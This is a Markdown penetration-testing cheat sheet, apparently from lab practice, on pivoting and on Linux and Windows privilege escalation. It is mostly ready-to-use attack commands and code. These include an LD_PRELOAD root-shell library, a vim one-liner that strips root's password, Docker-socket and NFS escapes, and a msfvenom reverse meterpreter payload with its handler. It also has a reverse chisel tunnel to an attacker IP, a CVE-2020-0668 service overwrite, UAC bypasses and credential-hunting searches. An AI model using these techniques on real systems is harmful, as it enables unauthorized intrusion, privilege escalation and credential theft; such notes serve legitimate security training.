# Pivoting

A way to access services that cannot be accessed by the outside

Kali -> Pivot Host -> Intranet Host (private)

The `PivotIntranetIP` is the private IP of the Pivot Host that can communicate with the Intranet Host, that is the two IPs share the first blocks, while the `IP` is its public one, that you can already connect to.

## Local forwarding

Send a local service to your machine. 

- **Ligolo** (64 bits only)

  1. On your machine, run `ligstart` to start the ligolo server

  2. File transfer  the agent on the target from `TOOLS/LIGOLO-AGENTS`

  3. On the target:

     ```bash
     ./agent -connect [TUNIP]:[LigoloPort] -ignore-cert
     ```

  4. On the ligolo server:

     ```
     session
     # Select the session
     ```

  5. On you PC, add the route

     ```bash
     sudo ip route add 240.0.0.1/32 dev ligolo
     ```

  6. On the ligolo server: `start`
  7. Access any local port on `240.0.0.1:[PORT]`

- **SSH**

  ```bash
  ssh -L [ATTACKER_PORT]:[INTRANET_IP]:[TARGET_PORT] [USER]@[IP] -fN
  ```

  - `INTRANET_IP` is a private IP, usually 127.0.0.1

  - `-fN` to background the ssh terminal

  - `-L` can be specified multiple times

## Dynamic forwarding

Access private subnetworks of the target. Forwards all the service of the private subnetworks to you.

**METHOD:**

1. `ifconfig`/`ipconfig` to see if there is a private network open

2. Pivoting (methods below)

3. Ping sweep: get the Ips different than the Pivot Intranet IP

   - `alive <CIDR>` for Ligolo

   - Local Linux (proxychains methods):

     ```bash
     for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
     ```

   - Local Windows (proxychains methods):

     ```bash
     for %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
     ```

4. nmap 

   - with proxychains on the alive hosts:

     ```bash
     sudo proxychains nmap -v -Pn -sT [IP]
     ```

   - with Ligolo:

     ```bash
     sudo nmap -PE -sCV [IP]
     ```

5. Enter in a proxychained ZSH so you don't have to type everytime

   `sudo proxychains zsh`

**TOOLS:**

- **Ligolo**: Win/Lin only 64bit

  1. On your machine, run `ligstart` to start the ligolo server

  2. File transfer  the agent on the target from `TOOLS/LIGOLO_AGENTS/`

  3. On the target:

     ```bash
     ./agent -connect [TUNIP]:11601 -ignore-cert
     ```

  4. On the ligolo server:

     `session` &rarr; `Select number` &rarr; `autoroute`
     - `New Interface`: If it is the first connection
     - `Existing one`: if the first one died
     

  7. **-----------------------------------Duble Tunneling--------------------------**

  8. In the first pivot session: 

     `listener_add --addr 0.0.0.0:11601 --to [KALI_IP]:11601 --tcp`

  9. Transfer the agent on the second pivot

     ```bash
     ligolo-agent -connect [FIRST_PIVOT_INTRANET_IP]:11601 -ignore-cert
     ```

  10. On Kali, create a new ligolo session

      ```bash
      ligcreate ligolo2
      sudo ip route add [SECOND_INTRANET_CIDR] dev ligolo2
      ```

  11. On Ligolo:

      `session` → `Select Number 2` → `start --tun ligolo2`

- **SSH**

  1. Enable dynamic forwarding

     ```bash
     ssh -D 9050 [USER]@[IP] [-i KEY]
     ```

  2. Add the port of `proxychains` in `/etc/proxychains4.conf`

     ```bash
     [PROXY] 127.0.0.1 9999
     ```

  3. SShuttle allows to perform pivoting similar to ligolo, without proxychains

    ```bash
    sshuttle -r [USER]@[IP] [-i KEY] [INTRANET_CIDR]
    ```

    

- **Rpivot** (SOCKS tunneling)

  1. On Kali, run server.py

     ```bash
     python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
     ```

  2. Transfer `rpivot` to the target `scp -r rpivot`

  3. Run client.py on the Pivot

     ```bash
     python2.7 client.py --server-ip <tunip> --server-port 9999
     ```

  4. Use proxychains

- **Netsh (Windows with Administrator priviledges)**

  Pivots by *connecting* the intranet IP to the Pivot address, which is *listening*.

  ```cmd
  netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=[PIVOT_IP] connectport=3389 connectaddress=[INTRANET_IP]
  ```

  Verify:

  ```cmd
  netsh.exe interface portproxy show v4tov4
  ```

  Then, from Kali, you can connect to the listen address diractly using xfreerdp or others `xfreerdp /v:[PIVOT_IP]`

- **chisel**: Win/Lin also 32bit

  1. Transfer chisel binary on the pivot host

     ```bash
     cd ~/TOOLS/CHISEL
     scp chisel <user>@<PivotIP>:<pathChisel>
     ```

     - Linux architecture: `uname -a`
     - Win architecture: `systeminfo`

  2. Run the server on the Pivot Host

     ````bash
     ./chisel server -v -p 1234 --socks5
     ````

  3. On Kali, connect to the server

     ```bash
     ./chisel client -v <PivotIP>:1234 socks
     ```

  4. In `/etc/proxychains4.conf` add `socks5 127.0.0.1 1080`

  5. Use `proxychains` to `IntranetIP`

- **chisel (reverse):**

  1. On Kali, start the server:

     ```bash
     sudo ~/TOOLS/CHISEL/chisel_lin64 server --reverse -v -p 1234 --socks5
     ```

  2. On the Pivot Host:

     ```bash
     ./chisel client -v 10.10.14.17:1234 R:socks
     ```

  3. Add `socks5 127.0.0.1 1080` in `/etc/proxychains4.conf` 

  4. Connect with `proxychains`

- **Metasploit**

- plink.exe

- netsh

- socat

- dnscat (very stealthy, uses DNS)

- Ptunnel


### Remote/reverse forwarding

Forward a local service to a remote port. Usually used to gain shells or exchange files from the pivoted hosts to other targets that are only reachable from the pivot hosts via dynamic forwarding.

- **Ligolo**

  1. On your machine, run `ligstart` to start the ligolo server

  2. File transfer  the agent on the target from `TOOLS/ligolo-ng/dist`

  3. On the target:

     ```bash
     ./agent -connect [TUNIP]:11601 -ignore-cert
     ```

  4. On the ligolo server:

     ```
     session
     # Select the session
     start 
     ```

  5. On the legolo server, add the listener

     ```bash
     listener_add --addr 0.0.0.0:30000 --to [KALI_IP]:8000 --tcp 
     ```

  6. Open listener

     ```bash
     listen 8000 	# netcat
     httpserv 8000	# hhtp 
     ```

  7. Request payload on `<PivotIntranetIP>:30000`

- **SSH** (e.g. for a rev shell)

  7. Generate a payload with `PayloadPort` and `IntranetIP`

  8. Transfer the payload from Kali -> comprised host -> private host

  9. On Kali, open a listener on `ListenPort`

  10. Connect to the Pivot and forward the connection from the pivot to you 

     ```bash
     ssh -R <PivotIntranetIP>:<PayloadPort>:0.0.0.0:<ListenPort> <User>@<IP> -vN
     ```

- **Metasploit**

- **Socat**

# Linux

## Fundamentals

### Terminal tricks

**EOF Writing**

Useful to write a file without a text editor

```bash
cat << EOF > [OUTPUT]
[WRITE_CONTENT_HERE]
EOF
```

- Terminal:

  - Bash command (for broken shells) `bash -c "<command>"`

  - While loop:

    ```bash
    while true; do commands; done
    ```

- Scipts:

  - Bash header: `#!/bin/bash`
  - Execute bash script: `chmod +x [FILE]` &rarr; `./[FILE]`
  - C compile: `gcc file.c -o file` &rarr; `./file`

### Tools

`./lse.sh -l1 -e /run,/proc,/sys`


## Users & Privileges

- `cat /etc/passwd | grep sh$`
- `printenv`
- Last logins: `lastlog`
- Active Users: `w`

### Groups

`id` &rarr; [interesting_groups](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe)

- **adm:** read all logs in `/var/log`

- **disk:** &rarr; escalate to root:

  full access to any device in `/dev` &rarr; `debugfs`

- **docker:** &rarr; escalate to root:

  ```bash
  docker run -v /root:/mnt -it ubuntu		# Creates a docker container
  cd /mnt/root
  ```

- **video:** can watch screen of logged in users `w`

- **staff**: can read/write `/usr/local/bin` and `/usr/local/sbin` 

  &rarr; check root processes 

- **lxd/lxc:**  &rarr; escalte to root 

  - [Method2](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) &rarr; `cd /mnt/root`


### Privileges

[GTFOBins](https://gtfobins.github.io/)

- `strace [BIN] -c1 [IP]`: track and analyze system calls and signal processing

#### SUDO:

```bash
sudo -l		 # List sudo privileges
# CHECK FOR SECURE PATH
sudo -V		 # Check sudo version

sudo su 	 # Switch to the root user 
su [USER] 	 # Switch to a local user
sudo -u [USER] [COMMAND] 	# Execute an application as an user, e.g. /bin/bash
```

**Exploits:**

- **LD PRELOAD**

  The `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones.

  1. Write the C file:

     ```c
     #include <stdio.h>
     #include <sys/types.h>
     #include <stdlib.h>
     #include <unistd.h>
     
     void _init() {
     unsetenv("LD_PRELOAD");
     setgid(0);
     setuid(0);
     system("/bin/bash");
     }
     ```

  2. Compile:

     ```bash
     gcc -fPIC -shared -o root.so root.c -nostartfiles
     ```

  3. ```bash
     sudo LD_PRELOAD=/tmp/root.so [BIN] restart
     ```

- Path Hijacking

- Writable dependency (libraries, ./executables...)

- Wildcard abuse

#### SUID binaries &rarr; Non-Default / [SUID3ENUM](https://github.com/Anon-Exploiter/SUID3NUM) Tool / GTFOBin:

```bash
find / -user root -perm -4000 -ls 2>/dev/null
```

**Exploits:**

- LDD Hijacking
- Python library Hijacking

#### SGID binaries:

```bash
find / -uid 0 -perm -6000 -type f 2>/dev/null
```

**Exploits:**

- Python library Hijacking

#### Capabilities

```bash
getcap -r / 2>/dev/null
```

- Some capabilities give you direct access to root [Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html?highlight=capabi#references):

  - `cap_setuid`

  - `cap_setgid`

  - `cap_sys_admin`

  - `cap_dac_override` allow to overwrite a file. E.g. for `vim`

    ```bash
    echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
    su
    ```


### Environment

- `env`

- **Path Abuse** &rarr;`echo $PATH`

  - Writable `$PATH` variable 

    ```bash
    PATH=.:${PATH}		# Adds current DIR to PATH
    export PATH
    ```

- **LDD Hijacking**

  1. `ldd [BIN]`: Displays the library of a bin, their location of the object and the hexadecimal address where they are loaded into memory

- **RPATH Hijacking**

  Check the`RUNPATH` configuration 

  ```bash
  readelf -d [BINARY] | grep -E "NEEDED|RPATH"
  ```

  Libraries in this folder are given preference over other folders &rarr; Place a malicious library here

- **Python Library Hijacking**

  - Library with write permission:

    Write the code *at the beginning* of the function that is called from the library

  - Library Path

    ```bash
    # List order of library importing
    python3 -c 'import sys; print("\n".join(sys.path))'
    # Show installation path
    pip3 show <module>
    ```

    - If there is a folder with write permission before the installation path of the module (higher in the list) you can create your module with, as the called function from the module, a payload.
    - Python will first look in the same folder as the script is written in!

  - PYTHONPATH edit

    `PYTHONPATH` is an environment variable that indicates what directories Python can search for modules to import.

    Requires also `sudo` on `python3` with `SETENV` flag

    ```bash
    sudo PYTHONPATH=/tmp/ /usr/bin/python3 [python_script]
    ```

    

- [Wildcard Abuse](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html):

  - chown, chmod
  - tar
  - rsync
  - 7z
  - zip

- **Symlinks attacks**

  A symlink is a link to a file `ln -s [FILE_target] [FILE_link]`

  The `*` character gets expanded to all the matching files.

  Examples:

  - `chown` and `chmod`

    - `chown [USER] [FILE]`

      Sets the owner of the specified `[FILE]` to the `[USER]`.

    - `chown [USER] [FILE] --reference=[REF FILE]`

      Sets the owner of the specified `[FILE]` to match the owner of the `[REF FILE]`, `[USER]` is ignored.

    ```bash
    # Create a file reference owned by us
    touch reference
    # Create a file called as the flag of chown
    touch -- --reference=reference
    ```

    If you create a symlink to **/etc/passwd** in the same directory, then the owner of /etc/passwd will also be you.


  Avoid checks:

  - If there is a check to control if the link is linking to a priviledged folder, you can do a double link:

    ```bash
    ln -s /root/root.txt [FILE HOP]	# Creates a link to root.txt
    ln -s [FILE HOP] [FILE]			# Creates a link to FILE HOP
    ```


## Credential Hunting

Directories & Files Worth Checking:

- Basic Hunt
  
  ```bash
  ls -la /opt /var/mail /var/spool /var/tmp /var/backups /srv
  ```
  
- Look for other users:
  
  ```bash
  grep -RHine '[USER]' /home /root /var /dev /opt /tmp 2>/dev/null
  ```
  
- Local Hashes
  
  - `/etc/shadow`
  
  - `/etc/security/opasswd`
  
- User Data
  - User Owned / Readable Files
  
    ```bash
    find / -type f -user [group] 2>/dev/null | grep -v -E "/proc|/sys|/run|/var/lib|/usr/src|/usr/share|/usr/lib|/var/cache|/boot|/etc|/bin|/sbin|/include|/log"
    ```
  
    ```bash
    find / -type f -readable 2>/dev/null | grep -v -E "/proc|/sys|/run|/var/lib|/usr/src|/usr/share|/usr/lib|/var/cache|/boot|/etc|/bin|/sbin|/include|/log"
    ```
  
  - User Data Directories
  
    - `/home` 
    - Hidden history files:
  
      ```bash
      find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
      ```
    - Relevant folders:
  
      ```bash
      ls -la /var/mail /var/backups /var/spool /mnt /var/tmp
      ```
  
- Traffic sniffing (if tcpdump installed)

  ```bash
  tcpdump -i [NIC] -nn -s0 -v port [PORT] -w [OUT_PCAP]
  ```
  
  -  [net-creds](https://github.com/DanMcInerney/net-creds)
  -  [PCredz](https://github.com/lgandx/PCredz)
  
- Service Config Files

  ```bash
  find / ! -path "*/proc/*" -iname "*conf*" -type f -readable 2>/dev/null | grep -v -E "proc|sys|run|var/lib|usr/src"
  ```

### Searching techniques

- If the login supports emails &rarr; search for domain `@domain.htb`

- Password is better to search file by file, only looking at config or backend files.

- Search credentials in folder and subfolders:

  ```bash
  grep -RHine "[STRING]" [PATH] [-e REGEX]
  ```

  - `-r` recursive
  - `-n` output the line number
  - `-i` case insensitive
  - `-H`  output the content

  Credentials are variable assignments, which are made of:

  - name: password, cred, pass, psw, token, key, secret
  - separator: =, : (with or without space)
  - quotes

  Some examples:

  ```bash
  grep -RHine "password = '" .	# string assignment (try also with \")
  grep -RHine "password':" . 		# dictionary assignment
  grep -RHine "password'," .		# tuple/list assignment
  grep -RHine "[PROTOCOL]://"		# URI assignment
  ```

- Shadow Hashes `/etc/shadow` 

## Network Services

```bash
netstat -tulnap | grep "LISTEN\|ESTABILISHED"
```

- `LISTEN`&rarr; Pivot
- `ENSTABLISHED`&rarr;Connect to / config files

**Sockets:**

```bash
netstat -a -p --unix		# See if there is a docker
```

```bash
find / -iname "docker.sock" 2>/dev/null	# Look for write permission
```

- If writable:

  ```bash
   docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
  ```

**NFS exports**

```bash
cat /etc/exports
```

- **no_root_squash**, then you can access it from as a client and write inside that directory as if you were the local root of the machine. 
- **no_all_squash** allows to emulate a non-root user

1. Check if NSF Port (2049) is Reachable → Forward It if Not

2. From Kali's `root` Session

   ````bash
   # Mount folder
   sudo mount -t nfs [VICTIM_IP]:/[NFS_SHARE] /mnt
   # copy a binary (e.g. bash) and make it suid
   cp /bin/bash /mnt
   chmod u+s /mnt/bash
   ````

3. Victim's Session → Execute `./bash -p` Inside NFS Share

### Databases

- MySQL
  - Wordpress: `cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'`
-  PSQL 
- MSSQL 
- MongoDB 
- Oracle

### HTTP

- Nginx / Apache Configs
  - Logs
    - `ls -la /var/log/[nginx/apache2]`
    - `access.log / error.log`
  - Virtual Hosts
    - Nginx -> `/etc/nginx/[nginx.conf/sites-*]`
    - Apache -> `/etc/apache2/*.conf`, eg `000-default.conf`
    - Also try `/usr/local/etc/` instead of `/etc`
- Web Root Access
  - `/var/www/[HOSTNAME/html]`, `/srv/[http/html]`, `/opt`
  - Strings -> `grep -Rnw -li . -e "[STRING]" 2>/dev/null`
  - Backend Files -> `.php`, `.jsp`, ..., Information in the Code
  - Database Files -> `.sqlite3`, `.sql`, `.db`, Others
  - Settings Files -> `.conf`, `.ini`, Others

### SSH

- Check if there is a private key: `ls -laR /home | grep ssh`

  - `id_rsa`
  - `id_ed25519`

- Read: copy it from `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`


  ```bash
  chmod 600 id_rsa	# More restrictive permission
  ssh root@10.10.10.10 -i id_rsa
  nano id_rsa	# open and copy on your machine
  ```

  - Write: place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`


```bash
ssh-keygen -f key	#Generate a key in the output file key
ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
ssh user@10.10.10.10 -i key	# Login
```

## Local Processes


Config Files:

- Look for local databases / chrome debuggers / password managers
- Folders -> `/opt`, `/`

### Running process

```bash
ps -ef | grep [USER] | grep -v ]
```

If no processes are visible, check `mount | grep ^proc`, and see if hidepid is equal to invisible or 2. If so, all processes are invisible, except for yours.

#### logrotate

It archives or disposes of old logs. Conf file: `/etc/logrotate.conf`

Requirements for [logrotten](https://github.com/whotwagner/logrotten):

1.  write permissions on the log files

    ```bash
    find / -type f -writable 2>/dev/null | grep -i log
    ```

    You should find a file names `smth.log` and `smth.log.1`

2. logrotate must run as a privileged user or `root`

3. vulnerable versions:
   - 3.8.6
   - 3.11.0
   - 3.15.0
   - 3.18.0

4. Determine option:

   ```bash
    grep "create\|compress" /etc/logrotate.conf | grep -v "#"
   ```

   - create

     ```bash
     ./logrotten -p ./payloadfile <smth.log>
     ```

   - compress

     ```bash
     ./logrotten -p ./payloadfile -c -s 4 <smth.log>
     ```

5. Try to trigger logrotate (e.g. writing smth.log)

#### tmux

You need to be able to be in the `devs` group or run tmux as suid/sudo/

running tmux process &rarr; attach to it  [tmux-sessions](https://redfoxsec.com/blog/terminal-multiplexing-hijacking-tmux-sessions/) (try also without sudo)

```bash
# Creates a new shared session
tmux -S /shareds new -s debugsess
# Change pemission
chown root:devs /shareds
# Attach to the session
tmux -S /shareds
```

### Recurrent processes

```bash
./pspy -pf -i 1000
```

- Try to trigger them (e.g. new ssh login)

#### Cronjobs

Each entry in the crontab file requires, in order: minutes, hours, days, months, weeks, commands. E.g, `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

- **Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
- **PATH Hijacking**

## Local Applications

### ELF Executable

ELF files is the format of binaries with .so libraries, which are in the momory of the process. It can connect to services, and are interesting even if they don't have privileges (sudo, suid). They are usually found:

- `/opt`
- `/usr/share`
- `/`
- `/home/[USER]`

-  Examine with [PEDA](https://github.com/longld/peda) Debugger

  ```bash
  gdb [BINARY]
  # Return every function and their address, exclude everything that starts with _, frame_dummy, register, deregister.
  gdb-peda$ info functions
  # Run the program
  gdb-peda$ run
  # Disassemble the function, start with main
  gdb-peda$ disas [FUNCTION]
  ```

- Check for calls to function, e.g. 

  `call   0x5555555551b0 <SQLDriverConnect@plt>`

  - **The name of the function** is what is inside `<>`, without `@plt`.  The presence of `@plt` indicates that the function is called by a library.

  - **The arguments of the functions** are stored before the call:

    - `%*di`: 1st arg

    - `%*si`: 2st arg

    - `%*dx`: 3rd arg

    `%*cx`: 4th arg

  - **The value of an argument,** is either an integer or a string.
    - Integers are stored with a dollar followed by its the actual value (in exadecimal)
    - Strings are visualized in white on the right-most column, and are preceded by an `#`. To get the value run: `x/s [VALUE WITHOUT #]`

- Add a breakpoint after a function is called

  ```bash
  gdb-peda$ b [NAME OF THE FUNCTION]
  # List breakpoints
  gdb-peda$ i b
  # Delete brakpoint
  gdb-peda$ d [NUM OF BREAKPOINT]
  ```

- Run the program again and see if you can get credentials.

  To have better redeability, since the CPU will be halted with a breakpoint, and you can check its status right before the call of the function with

  ```bash
  # Run until breakpoint
  gdb-peda$ r
  # check status of CPU
  gdb-peda$ i r
  # Continue after the breakpoint
  gdb-peda$ c
  # Jumo only to the next assembly instruction
  gdb-peda$ nexti
  ```

  and check its arguments.

- Change the value of an argument &rarr; exploit (e.g. SQL injection)

  ```bash
  gdb-peda$ set $[REGISTER]=0x[EX_VALUE] 
  ```

## OS 

- Kernel Exploits: 

  ```bash
  cat /etc/*-release && uname -a
  ```

- Packages -> `dpkg -l` / `rpm -qa` -> DebSecan Tool / Privesc Tools

- `polkit` vulnerability

- Installed packages:

  ```bash
  apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
  ```

## Docker Breakout

To check if you are in a docker container type `hostname`. A docker has a random string as hostname. Check [Docker Breakout](https://juggernaut-sec.com/docker-breakout-lpe/)

**CHECK OS VERSION:**

### Enumeration

```bash
# MOUNTED FILE (common with father machine)
lsblk	# Get mounted devices
mount -l | grep <device>	# Check folders/writable files

# NETWORK SCAN
ifconfig
# Local ping sweep
for i in {1..255} ;do (ping -c 1 [INTRANET_CIDR_BLOCK].$i | grep "bytes from"|cut -d ' ' -
f4|tr -d ':' &);done
# Locan port scan
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/[INTRANET_IP]/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
for port in {1..65535}; do echo > /dev/tcp/[IP]/$port && echo "$port open"; done 2>/dev/null
```

Search for sockets:

```bash
find / -name docker.sock 2>/dev/null # Usually in /run/docker.sock
```

- If it is in `/run/docker.sock`:

  ```bash
  #List images to use one
  docker images
  #Run the image mounting the host disk and chroot on it
  docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
  ```

- Otherwise use [docker bin32](https://get.docker.com/builds/Linux/i386/docker-latest.tgz) / [docker_bin_64](https://get.docker.com/builds/Linux/x86_64/docker-latest.tgz) (upload if not installed)

  ```bash
  # Create privileged container
  /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
  # List containers -> get ID of the new container
  /tmp/docker -H unix:///app/docker.sock ps	
  # Log in the container
  /tmp/docker -H unix:///app/docker.sock exec -it <id> /bin/bash
  # Get SSH key, /etc/shadow...
  ```

### ROOT

- `cat /etc/shadow`  → Shadow Hash Cracking

- **Mount Escape** (from escaped user to root)

  1. Check / create mounted (i.e. shared) folders 

     - Check: See enumeration

     - Create:

       `mkdir /mnt/host`  → `mount [HOST_DISK] /mnt/host`  

  2. Copy  bash/find... inside the mounted folder and give SUID to it

  3. Execute the payload from User Host that can access the mounted folder

# Windows

## Fundamentals

### cmd

```cmd
powershell								# Opens powershell
powershell -command "<PS command>"		# Exectes PS command
```

### Powershell

```powershell
start cmd.exe				# Opens cmd
cmd /c "<CMD Command>"		# Execute CMD command
```

There are two execution 32/64-Bit, cometimes you might need to switch:

- `c:\windows\syswow64\windowspowershell\v1.0\powershell.exe`
- `c:\windows\sysnative\windowspowershell\v1.0\powershell.exe`
#### Powershell scripts
Load every function of a script: `ipmo .\[PS1 FILE]`
### Desktop tricks

##### Disallow file deletions

Right click on the folder `Properties` -> `Security` -> `Advanced` -> `cybervaca` -> `Disable inheritance` -> `Convert inherited permissions into explicit permissions on this object` -> `Edit` -> `Show advanced permissions`, deselect the `Delete subfolders and files`, and `Delete`.

### Tools

- Run in the background while you do manual enumeration
	- Winpeas
	- PrivescCheck
	- JAWS
	- Seatbelt
- Credential Hunting:
  - `lazagne.exe all`
  - `Invoke-SessionGopher.ps1 -Target [HOSTNAME]`
  - [MSF-Credentials](https://github.com/carlospolop/MSF-Credentials)

## OS

### GUI Access Abuse
RDP only

- [CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388) with [vulnerable versions](https://web.archive.org/web/20210620053630/https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a)
                	1. Right click on `hhupd.exe` and `Run as administrator`
                	2. Click on `Show information about the publisher's certificate`
                	3. Click on `General Tab` &rarr; click on the link of `Issued by`
                	4. A browser will be launched as system &rarr; Browser Escape
                	5. Right-click anywhere on the web page and choose `View page source`
                	6. Right-click and select `Save as`
                	7. Type `c:\windows\system32\cmd.exe` in the file path
- [Support App](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#insecure-gui-apps) → [EoP Exploitation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#from-low-priv-user-to-nt-authority-system-cve-2019-1388-uac-bypass)

### System Info

- **Enumeration**

	- `systeminfo` &rarr; look for OS version
	- Installed updates: `wmic qfe list brief`
	- In meterpreter: local exploit suggester module


- **Research**

	- [PatchCheker](https://patchchecker.com)

	- `wes`
		
		```bash
		cd ~/TOOLS/PRIVESC_WINDOWS/wesng;
		python3 wes.py --update-wes;
		python3 wes.py ~/machines/systeminfo.txt --exploits-only --severity critical 
		```
		
		`systeminfo.txt` is a txt file with the output of systeminfo
	- **metasploit** (only for 32bit)
                	   `use post/multi/recon/local_exploit_suggester`
	- [Sherlock](https://github.com/rasta-mouse/Sherlock)



#### CVEs

- **[CVE-2021-36934](https://github.com/GossiTheDog/HiveNightmare) HiveNightmare, aka SeriousSam** Windows 10 

	Read of the SAM, SYSTEM, and SECURITY registry

- **[CVE-2021-1675/CVE-2021-34527]( [This](https://github.com/cube0x0/CVE-2021-1675)) PrintNightmare**

	If you have `SeLoadDriverPrivilege`, check for Spooler service:

	```powershell
	ls \\localhost\pipe\spoolss
	```

- [CVE-2020-0668](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/) on Windows Service Tracing &rarr; Use Visual Studio or look for prebuilt

  - look for any third-party software such as the  Mozilla Maintenance Service, that runs in the context of SYSTEM and is startable by unprivileged users or  [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges

  - Generate a malware

    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=4444 -f exe > maintenanceservice.exe
    ```

  - Generate a non broken copy

  	```cmd
  	copy .\maintenanceservice.exe .\maintenanceservice2.exe
  	```

  - Overwrite the privileges

    ```cmd
    C:\Tools\CVE-2020-0668\CVE-2020-0668.exe .\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
    ```

  - Overwrite the file with the malware

  	```cmd
  	copy /Y .\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
  	```

  - Start the listener

    ```bash
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST tun0; set LPORT 4444; exploit"
    ```

  - `net start MozillaMaintenance` will throw an error, but you should get the shell

### WSUS 

You can compromise the system if the updates are not requested using http**S** but http.

Check:

```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

If you get a reply such as one of these:

```shell
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```shell
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` **or** `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

### AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as `NT AUTHORITY\SYSTEM`.

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

1. Generate `msi` Payload with `metash`

2. Transfer and execute it:

	```cmd
	msiexec /quiet /qn /i out.msi
	```


## Users & Privileges

- List users: `net user`
- for every user: `net user [USER]`
- `tree /a /f c:\users`
- The users that are currently logged in: `query user`
- Password policy: `net accounts`
- Env variables: `set`
- User description field: `Get-LocalUser`
- OS description: `Get-WmiObject -Class Win32_OperatingSystem | select Description`

### UAC Upgrade

When you are member of Administrators, but you have restricted privileges and file access of a true SYSTEM user

- Enumeration `whoami /groups`

	- Normal Users   → Check if not `High Mandatory Label`
	- Administrators  → Check if not `System Mandatory Label`

- Bypasess

	- GUI Access                        

		-  CMD “Run as Administrator”
		-  PS:  `Start-Process cmd.exe -verb runas`

	- [UACME]([Exploit Reference](https://github.com/hfiref0x/UACME))

		- Get build number: `systeminfo | findstr "OS"`

		- Find key in the repo, related to the build number

		- ```cmd
                			Akagi64.exe [KEY] [CMD]
    ```

	- [Runas](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)

		- To get a Rev Shell:

			```powershell
			Invoke-RunasCs -username [USER] -password "[PASS]" -Command cmd.exe -Remote [KALI_IP]:[PORT] -LogonType 8 -BypassUac
			```

		- To get a general command execution:

			```powershell
			Invoke-RunasCs -username [USER] -password "[PASS]" -Cmd "[CMD]" -LogonType 8 -BypassUac
			```

### Privileges

-  `whoami /all` 

-  Check non-default privileges -> [Exploits](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html?highlight=sebackup#sebackupprivilege)

-  Enable a single privilege:

   ```powershell
   Set-[Privilege]
   Get-[Privilege]
   ```

-  Enable all privileges:
   
   - Service account (NT):  [FullPowers](https://github.com/itm4n/FullPowers)
   - User account: [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) `.\EnableAllTokenPrivs.ps1`

#### SeBackup

Allows to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control  entry (ACE) for us in the folder's access control list (ACL).

- **Local**: Arbitrary File Read

	1. Import [PS Modules](https://github.com/giuliano108/SeBackupPrivilege)
		```powershell
